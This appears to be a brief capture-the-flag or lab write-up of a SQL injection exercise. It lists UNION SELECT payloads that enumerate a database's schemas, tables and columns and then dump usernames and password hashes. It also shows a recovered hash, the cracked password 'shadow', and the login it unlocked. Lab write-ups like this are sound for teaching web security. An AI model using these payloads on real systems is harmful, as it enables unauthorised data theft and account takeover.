looking at all the columns of all the databases (1 UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns --) We knew a tab with username/password was existing
let's look for it

1 UNION SELECT SCHEMA_NAME,NULL FROM information_schema.schemata--
To have all database name

1 UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
To have all tables

1  UNION SELECT password,username from Member_Brute_Force.db_default --

We get the same password on two lines for root and admin: 3bf1114a986ba87ed28fc1b5884fc2f8

puting it on a password cracker (crackstation.net) we get a password 'shadow'

works with any username on the login page
